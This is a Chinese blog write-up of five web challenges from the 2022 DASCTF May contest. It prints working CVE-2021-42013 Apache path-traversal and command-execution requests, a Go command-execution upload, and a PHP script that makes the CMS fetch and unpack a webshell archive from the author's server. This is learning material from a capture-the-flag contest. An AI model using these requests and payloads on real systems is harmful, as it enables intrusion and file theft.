@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Ex1Le23">
+
+
+
+
+
+<title>2022DASCTF MAY 出题人挑战赛 web | Stuuupid&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Stuuupid&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Stuuupid&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">2022DASCTF MAY 出题人挑战赛 web</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Ex1Le23</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 6, 2022&nbsp;&nbsp;0:31:59</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/wp-CTF/">wp-CTF</a>
+                            
+                                <a href="/categories/wp-CTF/web/">web</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>#<a href="#a">1. Power Cookie</a><br>#<a href="#b">2. 魔法浏览器</a><br>#<a href="#c">3. getme</a><br>#<a href="#d">4. hackme</a><br>#<a href="#e">5. ezcms</a></p>
+<hr>
+<p>##<a id="a">Power Cookie</a></p>
+<blockquote>
+<p>提示：只有admin才可以获取flag</p>
+</blockquote>
+<p>依据提示可以猜测，本题可能需要通过修改cookie值来获取flag。<br>使用Burp Suite抓包查看Response包<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817102430418-1960049030.png" width=500><br>发现<code>admin=0</code><br>于是在Request包中加入<code>Cookie: admin=1</code><br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817102611588-243656756.png" width=500></p>
+<p>成功得到flag！</p>
+<hr>
+<blockquote>
+<p>本题做题过程初始，博主将<code>Cookie: admin=1</code>插在了请求包的末尾（如下图所示）<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817102906051-436308076.png" width=500><br>导致始终无响应，查阅资料发现header匹配到<code>Upgrade</code>时将被终止，调整位置后成功解决，原因庶几如此（<a target="_blank" rel="noopener" href="http://t.zoukankan.com/qinmengjiao123-123-p-13685262.html">请求头 header中传cookie不生效原因</a>）</p>
+</blockquote>
+<hr>
+<hr>
+<p>##<a id="b">魔法浏览器</a><br>进入后得到提示：</p>
+<blockquote>
+<p>提示：flag.txt<br>为保证文档安全。请使用魔法浏览器来访问。</p>
+</blockquote>
+<p>不明所以，F12查看<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817104826955-2116924557.png" width=500><br>得到进一步提示，需要<code>let ua = &quot;\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30 \x28\x57\x69\x6e\x64\x6f\x77\x73 \x4e\x54 \x31\x30\x2e\x30\x3b \x57\x69\x6e\x36\x34\x3b \x78\x36\x34\x29 \x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36 \x28\x4b\x48\x54\x4d\x4c\x2c \x6c\x69\x6b\x65 \x47\x65\x63\x6b\x6f\x29 \x4d\x61\x67\x69\x63\x2f\x31\x30\x30\x2e\x30\x2e\x34\x38\x39\x36\x2e\x37\x35&quot;</code><br>结合“使用魔法浏览器”可以猜想到应该将请求报文中的User-Agent修改为其要求的“Magic”内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75</span><br></pre></td></tr></table></figure>
+<p>发送，成功得到flag<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817105507623-1654583652.png" width=500></p>
+<p>[看其他师傅的wp时发现可以用console执行js，而不用去utf-8转码，又学到了一点]<img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817110336451-169494747.png" width=700></p>
+<hr>
+<hr>
+<p>##<a id="c">getme</a></p>
+<p>F12查看，一脸懵逼<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817182444328-2077107608.png" width=500><br>除了一行路径<code>pwd:/usr/local/apache2/</code>，得知其是apache，别无其它信息。<br>抓包查看返回包：<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817182848657-222743158.png" width="200"><br>只能说“黔驴技穷”。之后查找师傅们的wp和网上的各种资料，得知**Apache&#x2F;2.4.50 (Unix)**版本存在任意路径穿越漏洞（这时再回想起一开始的那一行路径，或许也是在提示这一点罢）。<br>[ <a target="_blank" rel="noopener" href="https://github.com/asaotomo/CVE-2021-42013-Apache-RCE-Poc-Exp">Apache 远程代码执行（CVE-2021-42013）</a>]<br>直接找到CVE，用poc和exp去打</p>
+<blockquote>
+<p>&#x2F;&#x2F;查看任意文件<br><code>GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1</code></p>
+</blockquote>
+<p>(若将<code>etc/passwd</code>改为<code>flag</code>，则可读取到flag，不过是假的，我们后面再看)</p>
+<blockquote>
+<p>&#x2F;&#x2F;执行任意命令<br><code>GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1</code></p>
+</blockquote>
+<p>我们利用exp和Burp Suite发送命令<br><code>echo Content-Type: text/plain; echo;ls / //这里的Content-Type: text/plain 规定将文件设置为纯文本的形式</code></p>
+<img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817184819761-451478684.png" width=500>
+
+<p>从而查看到所有的文件名，在其中发现flag，试图<code>echo;cat /flag</code>读取<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817184950024-333636240.png" width=500><br>结果发现为假，只能从其他的文件下手，这里凭运气选一个最奇怪的<code>diajgk</code>，然后一层层查看，最终在第四层发现一个貌似flag的文件，cat读取得到flag<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817185335437-2104134847.png" width=500></p>
+<hr>
+<p>这一题有三个问题在耗费了大量的时间，需要找时间再去理解清析：<br>1、在找flag的点上存在一些问题，如果要一个个去把文件都试一遍未免过于离谱。在找办法的过程中发现一位师傅通过分析查看日志的办法找到最终真正的flag的路径，不过因为不知道其使用了怎么样的命令而无法复现（点击图片可跳转到这位师傅的博客）<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/124994738"><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817185839323-780544381.png" width=500></a><br>2、如何运用该exp去执行更多其他的命令，有何规范？（我自己尝试的cd、tail等均无效）<br>3、echo有什么作用，与分号联合怎样使用？</p>
+<hr>
+<hr>
+<p>##<a id="d">hackme</a></p>
+<p>这题不出意外的没有什么思路，发现<strong>GOTOLIST</strong>是可以点击的链接，里面又有8个链接，一个个点进去，没有头绪，奇怪的是users点进去出现了这样一句：</p>
+<blockquote>
+<p>Sorry there doesn’t seem to be a users.go file</p>
+</blockquote>
+<p>又结合最后一个链接——上传一个**.go<strong>文件，猜测需要用该链接上传一个名叫</strong>users.go**的go文件，然后点击users执行文件。然而博主并不知道什么是go文件，也不知道怎么用，继续懵逼着去翻大佬们的wp，得知可以找到执行命令的go脚本 <a target="_blank" rel="noopener" href="https://golang.iswbm.com/c05/c05_02.html">os&#x2F;exec 执行命令的五种姿势</a>！</p>
+<p>选择执行命令并且能获取结果的办法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line">&quot;log&quot;</span><br><span class="line">&quot;os/exec&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    cmd := exec.Command(&quot;ls&quot;,&quot;/&quot;)</span><br><span class="line">    out, err := cmd.CombinedOutput()</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        fmt.Printf(&quot;combined out:\n%s\n&quot;, string(out))</span><br><span class="line">        log.Fatalf(&quot;cmd.Run() failed with %s\n&quot;, err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(&quot;combined out:\n%s\n&quot;, string(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现成功执行了<code>ls /</code>命令<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817203359350-1628717592.png"><br>且成功找到了藏起来的flag，将<code>cmd := exec.Command(&quot;ls&quot;,&quot;/&quot;)</code>更改为<code>cmd := exec.Command(&quot;cat&quot;,&quot;/flag&quot;)</code><br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817203655197-291459483.png" alt="成功获取flag"><br>成功获取flag！</p>
+<hr>
+<hr>
+<p>##<a id="e">ezcms</a></p>
+<p>下载文件后，发现有<code>admin.php</code>文件<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818201224459-1716179419.png" width=200></p>
+<p>得知该网站存在后台，对文件全局搜索“密码”，碰巧发现</p>
+<img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818202107960-1160034001.png" width=500>
+
+<p>用<code>admin 123456</code>成功登入后台。逛了一圈，能点的都点了一遍，没发现什么可利用的信息。于是一个个翻看源码，可是博主不够敏锐，没能发现存在着<code>Update.php</code>可以上传文件，后来查看其他大佬的wp才回过神来：嗯，在admin文件夹里，确实应该再仔细看一看。</p>
+<img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818203053359-275459141.png" width=600>
+
+<p>这段代码告诉我们，在这个页面，可以用<code>GET</code>方式传<code>url</code>值，然后该<code>url</code>经<code>sys_auth()</code>函数处理后就会被下载，判断<code>Content-Type</code>值为<code>application/zip</code>就会被解压，然后输出 <code>版本升级成功~</code></p>
+<p>于是考虑<code>sys_auth()</code>函数作何用处——加密或解密<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818203716598-553405938.png" width=500><br>且可判断，当<code>type=0</code>时加密，传入<code>type=1</code>为解密。<br>那么就思路便明确了，我们只需要在vps上部署一个“一句话木马”的压缩文件（.zip），得到<code>webshell.zip</code>的url，然后将该url用源码中的<code>sys_auth()</code>加密，最后以GET方式把加密后的url上传即可，具体实现如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&#x27;Mc_Encryption_Key&#x27;,&#x27;GKwHuLj9AOhaxJ2&#x27;);</span><br><span class="line"></span><br><span class="line">//字符加密、解密 [0为加密，1为解密]</span><br><span class="line">function sys_auth($string, $type = 0, $key = &#x27;&#x27;, $expiry = 0) &#123;</span><br><span class="line">	if(is_array($string)) $string = json_encode($string);</span><br><span class="line">	if($type == 1) $string = str_replace(&#x27;-&#x27;,&#x27;+&#x27;,$string);</span><br><span class="line">	$ckey_length = 4;</span><br><span class="line">	$key = md5($key ? $key : Mc_Encryption_Key);</span><br><span class="line">	$keya = md5(substr($key, 0, 16));</span><br><span class="line">	$keyb = md5(substr($key, 16, 16));</span><br><span class="line">	$keyc = $ckey_length ? ($type == 1 ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#x27;&#x27;;</span><br><span class="line">	$cryptkey = $keya.md5($keya.$keyc);</span><br><span class="line">	$key_length = strlen($cryptkey);</span><br><span class="line">	$string = $type == 1 ? base64_decode(substr($string, $ckey_length)) :  sprintf(&#x27;%010d&#x27;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;</span><br><span class="line">	$string_length = strlen($string);</span><br><span class="line">	$result = &#x27;&#x27;;</span><br><span class="line">	$box = range(0, 255);</span><br><span class="line">	$rndkey = array();</span><br><span class="line">	for($i = 0; $i &lt;= 255; $i++) &#123;</span><br><span class="line">		$rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">	&#125;</span><br><span class="line">	for($j = $i = 0; $i &lt; 256; $i++) &#123;</span><br><span class="line">		$j = ($j + $box[$i] + $rndkey[$i]) % 256;</span><br><span class="line">		$tmp = $box[$i];</span><br><span class="line">		$box[$i] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">	&#125;</span><br><span class="line">	for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">		$a = ($a + 1) % 256;</span><br><span class="line">		$j = ($j + $box[$a]) % 256;</span><br><span class="line">		$tmp = $box[$a];</span><br><span class="line">		$box[$a] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><br><span class="line">	&#125; </span><br><span class="line">	if($type == 1) &#123;</span><br><span class="line">		if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123;</span><br><span class="line">			$result = substr($result, 26);</span><br><span class="line">			$json = json_decode($result,1);</span><br><span class="line">			if(!is_numeric($result) &amp;&amp; $json)&#123;</span><br><span class="line">				return $json;</span><br><span class="line">			&#125;else&#123;</span><br><span class="line">				return $result;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return &#x27;&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	return str_replace(&#x27;+&#x27;, &#x27;-&#x27;, $keyc.str_replace(&#x27;=&#x27;, &#x27;&#x27;, base64_encode($result)));</span><br><span class="line">&#125;</span><br><span class="line">//以下为利用源码函数进行sys加密</span><br><span class="line">$ans=sys_auth(&quot;http://ip.ip.ip.ip/acmd.zip&quot;);//我上传的webshell压缩文件名为acmd.zip</span><br><span class="line">var_dump($ans);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>利用如上exp得到加密的url：</p>
+<blockquote>
+<p>事实上博主第一次失败了，发现原来代码里还存在着一个全局变量<img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818204653057-598288141.png"><br>跟踪查找即可以找到<code>define(&#39;Mc_Encryption_Key&#39;,&#39;GKwHuLj9AOhaxJ2&#39;);</code><br>加上这句定义后成功</p>
+</blockquote>
+<p><code>string(79) &quot;498bUpfpc2DVbWQdqxFIo8gRcC76FVJksWQcRwY5OCDSBXHMEF3zd07OYVMsJekRsip5UY2acffwS1Q&quot;</code><br>拿到加密url后直接上传：<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818205303419-51425222.png" width=500><br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818205518891-1217499246.png" width=500></p>
+<p>成功！接下来，我便开始试图在<code>update.php</code>源码中找到文件下载或解压后所在的位置，此间跟踪了几个类、函数如<code>mczip-&gt;PclZip()</code>结果并没有分析出什么来，只得再去翻看其他师傅的wp，发现他们的后门就在根目录下，于是蚁剑🗡连接，flag还是在根目录下:</p>
+<img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818210721537-1371645933.png" width=500>
+
+<p>打开后成功得到flag<code>DASCTF&#123;86527acc-676d-4267-a1a1-b46337a3a2a6&#125;</code></p>
+<hr>
+<p>这题于我而言很扯淡的点就是vps部署和解压目录查找，一开始我脑子有点进淼竟然用本地的PHP study搭建的网站上传压缩包……结果当然就是失败，报错信息是<code>压缩包不zip类型文件</code>我直接傻掉，一直在想如何把压缩包的content type类型调成他要求的zip，完全忽略了他根本进不了我的本地站点…后来部署在vps上成功得以解决；至于第二点仍需要学习，希望<strong>多指教</strong>~</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Ex1Le23</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://ex1le23.github.io/2022/12/06/2022DASCTF-MAY-%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-web/">https://ex1le23.github.io/2022/12/06/2022DASCTF-MAY-%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-web/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/web/"># web</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/12/06/2022DASCTF-X-SU-%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-web/">2022DASCTF X SU 三月春季挑战赛 web</a>
+            
+            
+            <a class="next" rel="next" href="/2022/12/06/2022DASCTF-Sept-X-%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-web/">2022DASCTF Sept X 浙江工业大学秋季挑战赛 web</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Ex1Le23 | Always Hold the Belief.</span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
